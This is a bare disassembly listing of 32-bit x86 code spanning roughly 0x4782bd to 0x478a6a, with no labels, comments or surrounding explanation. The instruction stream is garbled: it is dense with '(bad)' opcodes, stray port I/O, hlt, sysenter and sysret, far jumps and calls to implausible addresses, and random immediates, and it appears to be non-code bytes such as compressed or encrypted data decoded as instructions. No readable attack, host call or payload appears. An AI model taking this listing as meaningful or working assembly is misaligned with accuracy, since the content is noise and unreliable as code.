  4782bd:	imul   ebp,DWORD PTR [eax+eax*1-0x6e],0x132390b1
  4782c5:	dec    esp
  4782c6:	xchg   esp,eax
  4782c7:	pop    edi
  4782c8:	push   edi
  4782c9:	mov    ecx,0x2598d9fa
  4782ce:	and    BYTE PTR [ecx],0x3d
  4782d1:	sbb    edi,eax
  4782d3:	push   ebp
  4782d4:	and    al,0xec
  4782d6:	xchg   edi,eax
  4782d7:	sbb    ebx,eax
  4782d9:	mov    si,0xbc18
  4782dd:	sub    BYTE PTR [ecx+0x26],ch
  4782e0:	lods   al,BYTE PTR ds:[esi]
  4782e1:	popf   
  4782e2:	cmp    BYTE PTR ds:0x9fe16ea,bl
  4782e8:	mov    eax,ds:0x16791025
  4782ed:	fiadd  WORD PTR [eax-0x27]
  4782f0:	neg    edx
  4782f2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4782f4:	push   DWORD PTR [edi]
  4782f6:	js     0x47836d
  4782f8:	aaa    
  4782f9:	and    al,0x6a
  4782fb:	lods   eax,DWORD PTR ds:[esi]
  4782fc:	in     al,0x8
  4782fe:	jne    0x4782e0
  478300:	lahf   
  478301:	add    DWORD PTR [ebx],ecx
  478303:	pushf  
  478304:	push   eax
  478305:	punpcklbw mm2,DWORD PTR [edx+0x7dba089]
  47830c:	mov    bh,0x80
  47830e:	add    esp,DWORD PTR [ecx]
  478310:	lods   eax,DWORD PTR ds:[esi]
  478311:	or     eax,0xbb50e05c
  478316:	imul   edi,DWORD PTR [eax],0x66
  478319:	and    al,0x15
  47831b:	adc    bh,BYTE PTR [eax+0x58]
  47831e:	and    eax,0x660313a2
  478323:	add    ecx,edi
  478325:	jmp    0x88d846ff
  47832a:	and    ecx,DWORD PTR [ebx]
  47832c:	add    BYTE PTR [esi+0x24],dl
  47832f:	int    0x69
  478331:	inc    ecx
  478332:	add    esi,DWORD PTR [edi-0x2e316dde]
  478338:	aas    
  478339:	or     bh,dh
  47833b:	rcl    DWORD PTR [eax],1
  47833d:	daa    
  47833e:	sub    al,0x5e
  478340:	cmp    BYTE PTR [edi+ebx*1],0x86
  478344:	pop    edx
  478345:	mov    ch,0x80
  478347:	sbb    al,0x7
  478349:	aam    0x23
  47834b:	add    DWORD PTR [esi],ecx
  47834d:	lock test BYTE PTR [edi+ebp*2],cl
  478351:	aas    
  478352:	cmp    eax,esp
  478354:	mov    ebp,0xaaa229d6
  478359:	jle    0x4783a8
  47835b:	push   ss
  47835c:	arpl   WORD PTR [eax+0x20b2ba87],dx
  478362:	mov    esi,0x690c4a2a
  478367:	fidiv  WORD PTR [ecx+0x5e394d52]
  47836d:	pop    eax
  47836e:	jnp    0x478328
  478370:	fisttp QWORD PTR [eax-0x17804f]
  478376:	pop    eax
  478377:	jns    0x47839d
  478379:	adc    eax,0x6d0562c0
  47837e:	out    0x57,eax
  478380:	and    al,0xe4
  478382:	arpl   WORD PTR [edx],di
  478384:	inc    ebp
  478385:	xchg   esp,eax
  478386:	and    eax,DWORD PTR [ecx]
  478388:	aaa    
  478389:	and    al,0xd0
  47838b:	popf   
  47838c:	pop    eax
  47838d:	add    BYTE PTR [edi],dl
  47838f:	leave  
  478390:	adc    al,0xa5
  478392:	mov    eax,0xcd06aa51
  478397:	scas   eax,DWORD PTR es:[edi]
  478398:	pusha  
  478399:	cwde   
  47839a:	jo     0x47838c
  47839c:	mov    esi,0x45ef11f0
  4783a1:	sahf   
  4783a2:	cmp    BYTE PTR [eax+0x61],bl
  4783a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4783a6:	and    esp,0xfffffff8
  4783a9:	mov    fs,WORD PTR [ebx+ebp*2+0x4f9c5494]
  4783b0:	hlt    
  4783b1:	adc    cl,bh
  4783b3:	nop
  4783b4:	cdq    
  4783b5:	xor    esp,0x66414b57
  4783bb:	xchg   edi,eax
  4783bc:	jl     0x4783dd
  4783be:	iret   
  4783bf:	cmp    ebp,DWORD PTR [ebx]
  4783c1:	cmp    bh,al
  4783c3:	icebp  
  4783c4:	lock inc edx
  4783c6:	test   BYTE PTR [ecx],bh
  4783c8:	push   es
  4783c9:	fisubr DWORD PTR ds:0xefe1006f
  4783cf:	popf   
  4783d0:	sub    al,0x38
  4783d2:	call   DWORD PTR [edi+0xc]
  4783d5:	jl     0x4783f2
  4783d7:	inc    eax
  4783d8:	idiv   DWORD PTR [esi]
  4783da:	add    dh,BYTE PTR [ebx]
  4783dc:	enter  0x5a88,0x31
  4783e0:	cmp    al,0x27
  4783e2:	xchg   DWORD PTR [edx],eax
  4783e4:	(bad)
  4783e7:	lea    eax,[ecx+0x4b]
  4783ea:	cmp    al,0x5
  4783ec:	sbb    eax,0x2db8ac1a
  4783f1:	pop    esi
  4783f2:	dec    ebx
  4783f3:	mov    esp,0x8ef211ad
  4783f8:	hlt    
  4783f9:	push   edi
  4783fa:	nop
  4783fb:	das    
  4783fc:	sub    DWORD PTR [esp+ebx*2],ecx
  4783ff:	pop    eax
  478400:	add    BYTE PTR [ecx],ah
  478402:	inc    ecx
  478403:	in     eax,0x92
  478405:	and    DWORD PTR [eax+0x6b],0x76fce863
  47840c:	xchg   ebx,eax
  47840d:	adc    BYTE PTR [eax+0x44],bh
  478410:	mov    esi,ebx
  478412:	mov    al,BYTE PTR [esi+0x16]
  478415:	mov    BYTE PTR [edx+0x4],al
  478418:	adc    BYTE PTR [ebp+0x79734b9],ah
  47841e:	pop    es
  47841f:	push   es
  478420:	push   es
  478421:	add    eax,0xb5c0e08e
  478426:	or     dl,dh
  478428:	pop    edi
  478429:	js     0x47846b
  47842b:	pop    ebx
  47842c:	stc    
  47842d:	jmp    0xfd924637
  478432:	aaa    
  478433:	push   eax
  478434:	inc    ebx
  478435:	mov    edx,DWORD PTR [ecx-0x1711d88e]
  47843b:	or     DWORD PTR [ebp+0x30b32e38],edx
  478441:	push   eax
  478442:	pop    ebx
  478443:	rol    BYTE PTR [esp+esi*1+0x12],0x9f
  478448:	jmp    0x7458bbbd
  47844d:	aaa    
  47844e:	aaa    
  47844f:	sub    eax,0xc61d01b3
  478454:	ja     0x47847d
  478456:	daa    
  478457:	fiadd  WORD PTR [eax]
  478459:	je     0x4784ba
  47845b:	(bad)  
  47845c:	dec    edi
  47845d:	clc    
  47845e:	ror    esp,1
  478460:	stos   BYTE PTR es:[edi],al
  478461:	repz add ebx,ebp
  478464:	adc    BYTE PTR [ecx+0x4d],cl
  478467:	jp     0x478431
  478469:	and    esp,ebx
  47846b:	sbb    al,0x9f
  47846d:	sbb    al,BYTE PTR [ecx]
  47846f:	lock xchg esp,eax
  478471:	nop
  478472:	sub    al,0xcf
  478474:	dec    ebx
  478475:	sysenter 
  478477:	adc    al,0xaa
  478479:	jge    0x47846e
  47847b:	push   ebx
  47847c:	adc    ah,BYTE PTR [esi]
  47847e:	mov    eax,0x56f81122
  478483:	and    al,bh
  478485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  478486:	pop    ebp
  478487:	push   ebp
  478488:	mov    DWORD PTR [ecx+ebx*2],edx
  47848b:	fidiv  WORD PTR [esp+ecx*2+0xca22f7]
  478492:	pop    eax
  478493:	ins    BYTE PTR es:[edi],dx
  478494:	xor    ebp,edi
  478496:	inc    edi
  478497:	sub    eax,0x1e893131
  47849c:	dec    eax
  47849d:	shl    DWORD PTR [ecx+0xe194a83],0xd2
  4784a4:	jae    0x478465
  4784a6:	push   ecx
  4784a7:	cmp    cl,BYTE PTR [edx+edx*8-0x13b23e14]
  4784ae:	or     al,0xb8
  4784b0:	and    eax,0x4d65c78f
  4784b5:	mov    bh,0x87
  4784b7:	loope  0x47847c
  4784b9:	icebp  
  4784ba:	das    
  4784bb:	xor    eax,0x3b75d83b
  4784c0:	fdivr  DWORD PTR ds:0xa5ca93c7
  4784c6:	xor    al,dh
  4784c8:	cld    
  4784c9:	lock push eax
  4784cb:	pop    esi
  4784cc:	(bad)  
  4784cd:	idiv   DWORD PTR [edx+0x49]
  4784d0:	in     al,dx
  4784d1:	push   ebp
  4784d2:	in     al,dx
  4784d3:	sbb    DWORD PTR [edi],esi
  4784d5:	mov    al,0x75
  4784d7:	or     BYTE PTR [edx+0x28],al
  4784da:	inc    esp
  4784db:	sbb    al,0xa5
  4784dd:	rol    DWORD PTR [ebx+esi*4+0x79b908c3],cl
  4784e4:	ins    BYTE PTR es:[edi],dx
  4784e5:	dec    ebp
  4784e6:	inc    ecx
  4784e7:	in     al,dx
  4784e8:	mov    edx,0xe403ee02
  4784ed:	inc    ebp
  4784ee:	and    BYTE PTR [edi+0x3d],cl
  4784f1:	je     0x47849c
  4784f3:	xchg   BYTE PTR [edx-0x38],al
  4784f6:	pushf  
  4784f7:	sbb    al,0xdf
  4784f9:	push   0xffffff90
  4784fb:	sub    edx,eax
  4784fd:	cld    
  4784fe:	dec    ebp
  4784ff:	push   ebp
  478500:	(bad)  
  478501:	iret   
  478502:	sub    edi,DWORD PTR [ecx]
  478504:	or     al,0xf8
  478506:	lds    edi,FWORD PTR ds:0x4e034578
  47850c:	xor    al,0xa8
  47850e:	mov    eax,ds:0xf287a755
  478513:	add    esp,DWORD PTR es:[edi]
  478516:	push   edx
  478517:	aaa    
  478518:	mov    edi,0xd3724ee4
  47851d:	fadd   DWORD PTR [eax]
  47851f:	ret    0x9b2b
  478522:	cld    
  478523:	cmp    ch,BYTE PTR [esi+ebx*4]
  478526:	ficom  WORD PTR [ebx]
  478528:	xchg   ebx,eax
  478529:	enter  0xd691,0x53
  47852d:	jbe    0x47853c
  47852f:	inc    ebx
  478530:	stos   DWORD PTR es:[edi],eax
  478531:	and    BYTE PTR ds:0x5aa7b7e1,ch
  478537:	jno    0x47850c
  478539:	(bad)  
  47853b:	xchg   edx,eax
  47853c:	(bad)  
  47853d:	sbb    DWORD PTR [eax],esp
  47853f:	jns    0x478595
  478541:	xchg   DWORD PTR [eax+edi*8],esi
  478544:	and    al,0xf
  478546:	leave  
  478547:	dec    esi
  478548:	and    cl,dh
  47854a:	loopne 0x478556
  47854c:	jmp    0x478513
  47854e:	lock retf 0x10e2
  478552:	loop   0x478587
  478554:	neg    bl
  478556:	in     al,0x99
  478558:	ret    0xcf02
  47855b:	scas   al,BYTE PTR es:[edi]
  47855c:	clc    
  47855d:	xor    bl,dl
  47855f:	xor    al,0xbc
  478561:	dec    esp
  478562:	dec    edi
  478563:	xchg   edi,eax
  478564:	clc    
  478565:	daa    
  478566:	sbb    al,0x7
  478568:	lock ins DWORD PTR es:[edi],dx
  47856a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47856b:	pop    ds
  47856c:	or     BYTE PTR [ebx+0x30],bh
  47856f:	jmp    FWORD PTR [ebx+0x535dc298]
  478575:	pop    eax
  478576:	fwait
  478577:	js     0x47852d
  478579:	mov    al,0x18
  47857b:	(bad)  
  47857c:	call   DWORD PTR [ebx-0x4c]
  47857f:	cmp    al,0x10
  478581:	or     al,ah
  478583:	sbb    eax,0x2e14d767
  478588:	stos   BYTE PTR es:[edi],al
  478589:	push   eax
  47858a:	rcl    DWORD PTR [esi+ebx*1],cl
  47858d:	(bad)  [eax+0x15]
  478590:	jle    0x4785e5
  478592:	sub    al,BYTE PTR [eax+0xc75cb50]
  478598:	and    eax,0x325d0f89
  47859d:	inc    esi
  47859e:	push   edx
  47859f:	inc    esp
  4785a0:	inc    ebx
  4785a1:	shr    BYTE PTR [ecx+eax*1],0x8c
  4785a5:	cli    
  4785a6:	sub    ebx,DWORD PTR [edi-0x1f8e5d13]
  4785ac:	push   ecx
  4785ad:	push   0xd1a00313
  4785b2:	add    dh,dh
  4785b4:	clc    
  4785b5:	add    ebx,edi
  4785b7:	call   DWORD PTR [esi+eiz*2+0x51]
  4785bb:	retf   
  4785bc:	ins    DWORD PTR es:[edi],dx
  4785bd:	push   es
  4785be:	dec    eax
  4785bf:	popf   
  4785c0:	stos   BYTE PTR es:[edi],al
  4785c1:	mov    edx,DWORD PTR [ebx+ebx*4+0x61de9bec]
  4785c8:	xor    cl,cl
  4785ca:	pop    eax
  4785cb:	call   0x6f30208a
  4785d0:	je     0x478556
  4785d2:	xor    al,0x63
  4785d4:	adc    al,al
  4785d6:	and    BYTE PTR [eax-0x11],ch
  4785d9:	les    esp,FWORD PTR [esi]
  4785db:	sub    eax,0xe4185d01
  4785e0:	cmp    ebx,DWORD PTR [esi]
  4785e2:	lds    edx,FWORD PTR [edi-0x4f181b9c]
  4785e8:	add    eax,0x5880506e
  4785ed:	and    BYTE PTR [edi-0x20],dl
  4785f0:	mov    edx,0x20517403
  4785f5:	xor    DWORD PTR [edi-0x59],esp
  4785f8:	cld    
  4785f9:	push   ebx
  4785fa:	sub    DWORD PTR [ecx+0x58],0x77c341a9
  478601:	sub    al,0xba
  478603:	js     0x478631
  478605:	pop    es
  478606:	jl     0x478600
  478608:	push   eax
  478609:	inc    ebx
  47860a:	imul   esp,DWORD PTR [eax],0xffffffb2
  47860d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47860e:	and    DWORD PTR [eax],ebx
  478610:	dec    ebp
  478611:	cld    
  478612:	dec    esp
  478613:	add    ch,dh
  478615:	call   0x54dc:0xf8240d82
  47861c:	rol    eax,cl
  47861e:	popa   
  47861f:	and    al,0x87
  478621:	dec    ecx
  478622:	add    edx,DWORD PTR [ecx+0x3c]
  478625:	cmp    ch,BYTE PTR [edx+0x0]
  478628:	stos   DWORD PTR es:[edi],eax
  478629:	dec    edi
  47862a:	daa    
  47862b:	call   0xf0734e88
  478630:	jge    0x478653
  478632:	rcl    DWORD PTR [ecx+0x5],cl
  478635:	addr16 inc ebx
  478637:	lahf   
  478638:	jmp    0x4413:0xeb23fe67
  47863f:	or     BYTE PTR [ebx+edi*4+0x47],ah
  478643:	(bad)  
  478644:	and    BYTE PTR [esi+0xe],bl
  478647:	ret    0x3316
  47864a:	pop    ecx
  47864b:	and    DWORD PTR [ecx+0x60],esp
  47864e:	push   cs
  47864f:	dec    edx
  478650:	mov    edx,0x7c48c8b7
  478655:	mov    al,ds:0x8b7e2550
  47865a:	into   
  47865b:	dec    eax
  47865c:	rol    DWORD PTR [edi],0x9
  47865f:	aaa    
  478660:	sub    DWORD PTR [eax],edi
  478662:	les    ecx,FWORD PTR [esi+0x34e301e8]
  478668:	mov    eax,0xbe0f8f84
  47866d:	sub    BYTE PTR gs:[eax-0x70],bl
  478671:	jne    0x478617
  478673:	xchg   ebx,eax
  478674:	fcmovb st,st(4)
  478676:	inc    esp
  478677:	jp     0x478664
  478679:	pop    esp
  47867a:	add    al,0x19
  47867c:	(bad)  
  47867d:	lods   eax,DWORD PTR ds:[esi]
  47867e:	jecxz  0x478664
  478680:	mov    dl,0x31
  478682:	push   cs
  478683:	jg     0x4786a4
  478685:	adc    al,0xb9
  478687:	(bad)  
  478688:	add    ah,bl
  47868a:	mov    dh,0x14
  47868c:	int    0xba
  47868e:	pop    edx
  47868f:	(bad)  
  478690:	(bad)  
  478691:	cmp    ebp,eax
  478693:	je     0x47869c
  478695:	mov    ah,0xef
  478697:	or     esi,0x62
  47869a:	pop    ebp
  47869b:	ret    0xea5
  47869e:	adc    DWORD PTR [edi],edi
  4786a0:	or     al,0xf8
  4786a2:	sbb    ah,BYTE PTR [ebp+ebp*4+0x2408165b]
  4786a9:	jne    0x47866e
  4786ab:	add    eax,0xf67f858c
  4786b0:	push   0x34
  4786b2:	call   0xcabfd178
  4786b7:	mov    eax,ds:0x346a2430
  4786bc:	push   ebx
  4786bd:	add    BYTE PTR [esi+0x19],cl
  4786c0:	add    bh,BYTE PTR [edi+edx*8-0x74c0ad70]
  4786c7:	out    0x47,eax
  4786c9:	jb     0x4786d3
  4786cb:	sub    BYTE PTR [edi+ebx*8-0x69],0x52
  4786d0:	pop    esi
  4786d1:	dec    esp
  4786d2:	xor    DWORD PTR [esi],ecx
  4786d4:	pop    eax
  4786d5:	xchg   edi,eax
  4786d6:	pop    ss
  4786d7:	clc    
  4786d8:	cmp    BYTE PTR ss:[edx+eax*1],0x13
  4786dd:	cmp    DWORD PTR [ebx+0x1c],edx
  4786e0:	sub    edi,edx
  4786e2:	(bad)  
  4786e3:	setne  BYTE PTR [ecx]
  4786e6:	lock dec DWORD PTR [esi+0x4c]
  4786ea:	sub    esi,eax
  4786ec:	lea    edi,[esi-0x17]
  4786ef:	push   es
  4786f0:	jns    0x478706
  4786f2:	into   
  4786f3:	push   ebp
  4786f4:	push   ss
  4786f5:	sbb    DWORD PTR [eax+ecx*8],ecx
  4786f8:	jecxz  0x4786b4
  4786fa:	jmp    0x478712
  4786fc:	jmp    FWORD PTR [ebx+esi*4]
  4786ff:	and    edx,DWORD PTR [ebx+0x21]
  478702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  478703:	stos   BYTE PTR es:[edi],al
  478704:	push   edi
  478705:	inc    eax
  478706:	push   ebx
  478707:	fldenv [esi]
  478709:	inc    edx
  47870a:	adc    bl,BYTE PTR [ebx]
  47870c:	push   edi
  47870d:	mov    edi,0xe43012f1
  478712:	or     BYTE PTR [ebp-0x17],bl
  478715:	push   cs
  478716:	jns    0x478725
  478718:	push   0xcc7964c0
  47871d:	push   ebx
  47871e:	clc    
  47871f:	loopne 0x4786d1
  478721:	lds    ecx,FWORD PTR [edx+0x62]
  478724:	pop    ss
  478725:	dec    eax
  478726:	push   edi
  478727:	nop
  478728:	sbb    al,0xc1
  47872a:	xor    eax,0xd35f6413
  47872f:	mov    eax,0xf0325602
  478734:	adc    edi,DWORD PTR [eax+0x24]
  478737:	mov    cl,0x50
  478739:	jg     0x478744
  47873b:	push   edx
  47873c:	cmp    ch,ah
  47873e:	mov    ebx,0x15e8e19d
  478743:	dec    eax
  478744:	push   ebp
  478745:	les    eax,FWORD PTR [ebp+0x1a9b19de]
  47874b:	fist   WORD PTR [ebx-0x3b]
  47874e:	mov    DWORD PTR [ecx],edx
  478750:	arpl   di,di
  478752:	stc    
  478753:	aam    0x54
  478755:	and    eax,0x4cf88579
  47875a:	clc    
  47875b:	jo     0x4787cd
  47875d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47875e:	scas   eax,DWORD PTR es:[edi]
  47875f:	push   esp
  478760:	push   esi
  478761:	outs   dx,BYTE PTR ds:[esi]
  478762:	adc    BYTE PTR [ebx],cl
  478764:	bound  ebx,QWORD PTR [ebx+esi*4-0x3c]
  478768:	add    bh,ah
  47876a:	push   ebp
  47876b:	jge    0x478795
  47876d:	add    eax,0x8f225e5
  478772:	mov    edx,0xb01061f0
  478777:	faddp  st(5),st
  478779:	mov    dh,0x54
  47877b:	in     al,0x51
  47877d:	fst    QWORD PTR [edx-0x33]
  478780:	js     0x478731
  478782:	fist   DWORD PTR [ebx+eax*2+0x17]
  478786:	sbb    DWORD PTR [ebp-0x6e97d009],ebp
  47878c:	cmp    al,0x20
  47878e:	jp     0x478746
  478790:	xor    eax,0x245552b
  478795:	jns    0x47875f
  478797:	js     0x4787cb
  478799:	push   ebp
  47879a:	fild   WORD PTR [ebx]
  47879c:	scas   eax,DWORD PTR es:[edi]
  47879d:	add    edx,edx
  47879f:	daa    
  4787a0:	test   DWORD PTR [ebp+0xb],edx
  4787a3:	push   0xfc698e4c
  4787a8:	lds    edi,FWORD PTR [ecx]
  4787aa:	enter  0xbd6e,0xc8
  4787ae:	mov    bl,0x60
  4787b0:	push   eax
  4787b1:	mov    al,0x8c
  4787b3:	push   ebp
  4787b4:	out    dx,eax
  4787b5:	inc    ecx
  4787b6:	push   esp
  4787b7:	add    dl,BYTE PTR [edi]
  4787b9:	mov    ch,0x80
  4787bb:	adc    ah,al
  4787bd:	adc    dh,BYTE PTR [edx+eax*4]
  4787c0:	dec    ecx
  4787c1:	mov    bh,0xc3
  4787c3:	push   ecx
  4787c4:	loopne 0x478833
  4787c6:	adc    BYTE PTR [ebp-0x1e948ef2],cl
  4787cc:	pop    ebp
  4787cd:	and    eax,0x2f226a2f
  4787d2:	and    BYTE PTR [edi-0x54],0xf6
  4787d6:	aaa    
  4787d7:	daa    
  4787d8:	orps   xmm1,XMMWORD PTR [ebx-0x3c]
  4787dc:	jne    0x478829
  4787de:	or     esi,edx
  4787e0:	adc    BYTE PTR [edi-0x4c],0xe0
  4787e4:	inc    ebx
  4787e5:	cmp    esp,ebp
  4787e7:	push   ss
  4787e8:	push   esi
  4787e9:	adc    eax,esp
  4787eb:	enter  0xb4c,0xff
  4787ef:	lock lock nop
  4787f2:	dec    esi
  4787f3:	aam    0x9a
  4787f5:	popa   
  4787f6:	lea    esi,[ebx+esi*4+0x3921ce6]
  4787fd:	(bad)
  478800:	push   esi
  478801:	mov    DWORD PTR [ebx],esi
  478803:	(bad)  
  478804:	ror    BYTE PTR [edi-0x14b0f9b7],cl
  47880a:	inc    esi
  47880b:	mov    esp,DWORD PTR [esp+ebp*2]
  47880e:	jmp    0x8a:0x3212456
  478815:	jecxz  0x47888e
  478817:	mov    BYTE PTR [eax+0xe],bh
  47881a:	sub    al,0xa
  47881c:	mov    es,WORD PTR [ebx]
  47881e:	jne    0x47880e
  478820:	mov    ecx,DWORD PTR [ebx]
  478822:	sub    edi,DWORD PTR [eax-0x6f7d5e16]
  478828:	pop    edx
  478829:	or     BYTE PTR [edi],bh
  47882b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47882d:	sub    eax,0x6619e16f
  478832:	cmp    BYTE PTR [eax],0xd
  478835:	jne    0x478847
  478837:	or     al,BYTE PTR [edi+eiz*4-0x68]
  47883b:	sbb    al,BYTE PTR [eax]
  47883d:	dec    ebx
  47883e:	rcl    BYTE PTR [esi-0x7],1
  478841:	xor    BYTE PTR [edx+0x56ed57a5],ch
  478847:	lods   eax,DWORD PTR ds:[esi]
  478848:	hlt    
  478849:	mov    bl,BYTE PTR [ebx]
  47884b:	sbb    DWORD PTR [edi],ebx
  47884d:	(bad)  
  47884e:	outs   dx,BYTE PTR ds:[esi]
  47884f:	push   edi
  478850:	test   DWORD PTR [ecx-0x1e],esi
  478853:	inc    esp
  478854:	xchg   ebp,eax
  478855:	mov    ah,dl
  478857:	push   ecx
  478858:	and    eax,esp
  47885a:	add    ch,BYTE PTR [ebx]
  47885c:	cmp    ecx,esp
  47885e:	mov    ds:0x443852db,eax
  478863:	xchg   ebx,eax
  478864:	mov    DWORD PTR [edx+edi*1+0x6b],edi
  478868:	test   BYTE PTR [eax+0x2ddc8dc3],dl
  47886e:	jne    0x4788c7
  478870:	mov    edi,0x650929c6
  478875:	jno    0x4788d7
  478877:	psadbw mm0,QWORD PTR [ebx+0x4]
  47887b:	add    eax,0x49a07fc
  478880:	cmp    eax,0x438a9c71
  478885:	pop    es
  478886:	imul   edi,DWORD PTR [edi+0x3a37a87f],0x5e
  47888d:	pop    es
  47888e:	jne    0x478896
  478890:	test   BYTE PTR [esi+0x3e],0x7
  478894:	or     BYTE PTR [esi+0xa],0x88
  478898:	sbb    al,0xc2
  47889a:	push   ebp
  47889b:	call   0xc04e96a9
  4788a0:	test   al,0xe9
  4788a2:	call   0x280f:0x24046681
  4788a9:	sub    al,0xc9
  4788ab:	inc    eax
  4788ac:	loope  0x4788ff
  4788ae:	adc    eax,0x890e343a
  4788b3:	in     eax,dx
  4788b4:	push   0x460c0a61
  4788b9:	or     BYTE PTR ds:0x784b910c,dl
  4788bf:	sysret 
  4788c1:	ds push ebp
  4788c3:	mov    dl,0xe5
  4788c5:	stos   BYTE PTR es:[edi],al
  4788c6:	aaa    
  4788c7:	sub    dh,BYTE PTR [eax+ebp*1]
  4788ca:	pop    edi
  4788cb:	test   al,0xc9
  4788cd:	std    
  4788ce:	cld    
  4788cf:	les    eax,FWORD PTR [edx]
  4788d1:	bound  edi,QWORD PTR [edi+edx*2]
  4788d4:	loope  0x478856
  4788d6:	sub    al,0x1c
  4788d8:	mov    ebp,0x14286a25
  4788dd:	mov    WORD PTR [ecx],fs
  4788df:	mov    dl,0xae
  4788e1:	(bad)  
  4788e2:	rcl    DWORD PTR cs:[ebp+0x218b8280],cl
  4788e9:	hlt    
  4788ea:	mov    dh,0x1c
  4788ec:	jo     0x47890b
  4788ee:	adc    BYTE PTR ds:0x26aab354,0xc2
  4788f5:	add    ch,bl
  4788f7:	sbb    BYTE PTR [esi],dl
  4788f9:	and    al,0xa
  4788fb:	not    BYTE PTR [ecx+edx*4-0xa6a56d9]
  478902:	adc    DWORD PTR [eax-0x3d3248f4],esi
  478908:	or     BYTE PTR [edi-0x11776c52],bl
  47890e:	pop    ss
  47890f:	mov    edx,ds
  478911:	arpl   WORD PTR [ecx+0x9],sp
  478914:	data16 or al,0x22
  478917:	mov    edx,0x6ab44e07
  47891c:	xor    al,dl
  47891e:	enter  0x824,0x1f
  478922:	xchg   esi,eax
  478923:	out    0x90,al
  478925:	arpl   WORD PTR [edi],si
  478927:	sub    ch,BYTE PTR [eax+ebp*1]
  47892a:	outs   dx,BYTE PTR ds:[esi]
  47892b:	or     esi,DWORD PTR [ebx*4-0xaccebaf]
  478932:	xchg   edx,eax
  478933:	test   BYTE PTR [ebp+0x4a02c113],ch
  478939:	pop    esp
  47893a:	dec    ebx
  47893b:	adc    al,0xdb
  47893d:	inc    ebx
  47893e:	xor    DWORD PTR [eax],esi
  478940:	pop    ebx
  478941:	sub    al,bl
  478943:	push   ecx
  478944:	xor    bh,0x49
  478947:	mov    es,WORD PTR [ebx]
  478949:	or     bh,cl
  47894b:	adc    al,0x87
  47894d:	jl     0x4788ff
  47894f:	add    al,0x65
  478951:	test   eax,0x3ff0048d
  478956:	sbb    eax,0x2c676011
  47895b:	les    ebp,FWORD PTR [edx-0x712dfc07]
  478961:	mov    ch,0xdb
  478963:	inc    ebx
  478964:	adc    al,0xf0
  478966:	or     eax,DWORD PTR [eax+esi*8-0x13]
  47896a:	rol    DWORD PTR [edi],cl
  47896c:	ficomp DWORD PTR [edx]
  47896e:	or     eax,edi
  478970:	ins    BYTE PTR es:[edi],dx
  478971:	fld    QWORD PTR [ebp+0x24c948ff]
  478977:	pop    es
  478978:	or     al,0x7b
  47897a:	iret   
  47897b:	and    dl,dl
  47897d:	sahf   
  47897e:	fwait
  47897f:	pop    ebp
  478980:	add    DWORD PTR [ecx-0x38],ecx
  478983:	mov    ebx,0xf0df0710
  478988:	lahf   
  478989:	pushf  
  47898a:	pop    eax
  47898b:	add    dl,bl
  47898d:	mov    ebx,0xa87c1d61
  478992:	inc    eax
  478993:	pop    eax
  478994:	enter  0xeb31,0x11
  478998:	(bad)  
  478999:	xchg   DWORD PTR [eax],eax
  47899b:	jmp    0x4789af
  47899d:	cli    
  47899e:	adc    DWORD PTR [ebx],edi
  4789a0:	push   es
  4789a1:	hlt    
  4789a2:	add    DWORD PTR [ecx-0x7d6ad2d7],edx
  4789a8:	push   esi
  4789a9:	not    DWORD PTR [edx+0x4]
  4789ac:	das    
  4789ad:	push   ecx
  4789ae:	int    0xee
  4789b0:	mov    ah,0xf0
  4789b2:	xchg   BYTE PTR [edx+0x1f],ch
  4789b5:	in     al,dx
  4789b6:	ror    BYTE PTR [ebx+0x2c596b0],1
  4789bc:	in     eax,dx
  4789bd:	not    DWORD PTR [ebx+0x30]
  4789c0:	xor    edx,ebx
  4789c2:	adc    al,0x48
  4789c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4789c5:	or     al,0x3b
  4789c7:	je     0x4789cf
  4789c9:	jg     0x478a3b
  4789cb:	sbb    ebp,esp
  4789cd:	in     eax,dx
  4789ce:	dec    ecx
  4789cf:	mov    ebx,DWORD PTR [edx+ecx*1+0x3]
  4789d3:	(bad)  
  4789d5:	jmp    0x478a01
  4789d7:	ficom  DWORD PTR [eax+ebx*8]
  4789da:	mov    BYTE PTR [edi+edx*2-0x1b634698],ch
  4789e1:	xor    al,0x42
  4789e3:	adc    BYTE PTR [ebx-0x7e],bh
  4789e6:	mov    edi,0x57de995
  4789eb:	lea    esi,[ebx+0x1]
  4789ee:	jmp    0x478a0b
  4789f0:	dec    esp
  4789f1:	imul   esp,DWORD PTR ds:0xf740c8a2,0x1950d75
  4789fb:	clc    
  4789fc:	add    DWORD PTR [ebx+0x53],ecx
  4789ff:	mov    ebx,0x91f38a6a
  478a04:	jle    0x4789bd
  478a06:	mov    bl,0x41
  478a08:	imul   esp,DWORD PTR [eax+0x6a],0x14578a30
  478a0f:	hlt    
  478a10:	push   ds
  478a11:	ret    0x4fa8
  478a14:	(bad)  
  478a15:	jmp    0x61b6:0xac28adf2
  478a1c:	outs   dx,DWORD PTR ds:[esi]
  478a1d:	sbb    BYTE PTR [edx+ebx*8],cl
  478a20:	adc    eax,0x76147e0b
  478a25:	jno    0x478aa0
  478a27:	and    edx,eax
  478a29:	push   esp
  478a2a:	cmp    cl,BYTE PTR [ebx-0x74a987fc]
  478a30:	push   eax
  478a31:	sbb    BYTE PTR [esi+ecx*2-0x22],bl
  478a35:	jl     0x478a29
  478a37:	test   esi,esi
  478a39:	mov    BYTE PTR [ebx],0xc1
  478a3c:	(bad)  
  478a3d:	mov    esi,0x8fc0c5be
  478a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478a43:	call   0xbd3a:0x875e6dd6
  478a4a:	bound  esp,QWORD PTR [esi+0x400f0e07]
  478a50:	adc    BYTE PTR [ebx],0x19
  478a53:	fstp   TBYTE PTR [eax+0x1a]
  478a56:	dec    ebp
  478a57:	mov    al,0x13
  478a59:	cmp    al,0xe2
  478a5b:	push   0x70
  478a5d:	scas   eax,DWORD PTR es:[edi]
  478a5e:	pop    edi
  478a5f:	inc    eax
  478a60:	add    BYTE PTR ds:0xa5264478,ch
  478a66:	(bad)  
  478a67:	int    0xb
  478a69:	xchg   esi,eax
  478a6a:	jl     0x478a06
